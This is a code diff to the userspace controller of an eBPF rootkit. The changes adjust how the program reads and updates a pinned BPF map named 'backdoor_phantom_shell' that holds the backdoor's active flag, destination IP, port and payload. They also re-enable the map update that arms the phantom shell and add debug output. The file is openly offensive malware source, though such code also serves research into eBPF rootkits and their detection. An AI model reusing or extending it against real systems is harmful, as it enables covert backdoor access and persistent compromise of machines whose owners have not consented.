@@ -39,7 +39,7 @@
 		goto cleanup\
 	}
 
-static int FD_TC_MAP;
+int FD_TC_MAP;
 __u32 ifindex; //Interface to which the rootkit connects
 char* local_ip;
 
@@ -193,24 +193,30 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 		}
 	}else if(e->event_type == PSH_UPDATE){
 		printf("Requested to update the phantom shell\n");
-		int key = 1;
+		__u64 key = 1;
 		struct backdoor_phantom_shell_data data;
 		struct bpf_map_info map_expect = {0};
 		struct bpf_map_info info = {0};
 		FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
-		printf("TC MAP ID: %i\n", FD_TC_MAP);
 		map_expect.key_size    = sizeof(__u64);
 		map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
 		map_expect.max_entries = 1;
 		int err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
+		printf("TC MAP ID: %d\n", FD_TC_MAP);
 		if (err) {
 			fprintf(stderr, "ERR: map via FD not compatible\n");
 			return err;
 		}
+		printf("Collected stats from BPF map:\n");
+		printf(" - BPF map (bpf_map_type:%d) id:%d name:%s"
+			" key_size:%d value_size:%d max_entries:%d\n",
+			info.type, info.id, info.name,
+			info.key_size, info.value_size, info.max_entries
+			);
 		err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
 		if(err<0) {
 			printf("Failed to read the shared map: %d\n", err);
-			return -1;
+			//return -1;
 		}
 		printf("Pre value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
 		data.active = e->bps_data.active;
@@ -354,13 +360,13 @@ int main(int argc, char**argv){
 	}
 
 	FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
-	printf("TC MAP ID: %i\n", FD_TC_MAP);
+	printf("TC MAP ID: %d\n", FD_TC_MAP);
 	map_expect.key_size    = sizeof(__u64);
 	map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
 	map_expect.max_entries = 1;
 	err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
 	if (err) {
-		fprintf(stderr, "ERR: map via FD not compatible\n");
+		fprintf(stderr, "ERR: map via FD not compatible. Is the TC hook open?\n");
 		return err;
 	}
 	printf("Collected stats from BPF map:\n");
@@ -369,14 +375,15 @@ int main(int argc, char**argv){
 			info.type, info.id, info.name,
 			info.key_size, info.value_size, info.max_entries
 			);
-	int key = 1;
+	__u64 key = 1;
 	struct backdoor_phantom_shell_data data;
 	err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
 	if(err<0) {
 		printf("Failed to lookup element\n");
+		return -1;
 	}
 	printf("Value: %i, %i, %i\n", data.active, data.d_ip, data.d_port);
-	//bpf_map_update_elem(tc_efd, &key, &data, 0);
+	bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
 
 	/*bpf_obj_get(NULL);
 	char* DIRECTORY_PIN = "/sys/fs/bpf/mymaps";
